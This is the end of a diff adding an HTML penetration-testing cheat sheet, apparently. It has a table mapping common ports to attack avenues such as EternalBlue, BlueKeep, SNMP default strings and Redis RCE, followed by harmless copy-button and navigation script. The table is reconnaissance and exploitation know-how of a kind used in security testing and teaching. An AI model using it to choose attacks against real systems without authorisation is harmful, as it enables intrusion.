+          <tr><td>25</td><td>SMTP</td><td>Open relay, user enumeration (VRFY/EXPN)</td></tr>
+          <tr><td>53</td><td>DNS</td><td>Zone transfer (AXFR), subdomain enum</td></tr>
+          <tr><td>80/443</td><td>HTTP/S</td><td>Full OWASP Top 10 attack surface</td></tr>
+          <tr><td>110</td><td>POP3</td><td>Cleartext auth, brute force</td></tr>
+          <tr><td>139/445</td><td>SMB</td><td>Null sessions, EternalBlue, share listing</td></tr>
+          <tr><td>161</td><td>SNMP</td><td>Default community strings (public/private)</td></tr>
+          <tr><td>3306</td><td>MySQL</td><td>Exposed externally, weak creds, UDF injection</td></tr>
+          <tr><td>3389</td><td>RDP</td><td>BlueKeep, brute force, credential spraying</td></tr>
+          <tr><td>5985</td><td>WinRM</td><td>Evil-WinRM with valid creds</td></tr>
+          <tr><td>6379</td><td>Redis</td><td>No auth, RCE via config write</td></tr>
+          <tr><td>8080</td><td>HTTP-Alt</td><td>Admin panels, dev servers</td></tr>
+        </tbody>
+      </table>
+    </section>
+
+  </main>
+</div>
+
+<script>
+  function copyBlock(btn) {
+    const pre = btn.closest('.cmd-block').querySelector('pre');
+    navigator.clipboard.writeText(pre.innerText).then(() => {
+      btn.textContent = 'copied!'; btn.classList.add('copied');
+      setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1800);
+    });
+  }
+  const sections = document.querySelectorAll('.section');
+  const links = document.querySelectorAll('.sidebar nav a');
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        links.forEach(l => l.classList.remove('active'));
+        const link = document.querySelector(`.sidebar nav a[href="#${e.target.id}"]`);
+        if (link) link.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-40% 0px -55% 0px' });
+  sections.forEach(s => observer.observe(s));
+</script>
+</body>
+</html>
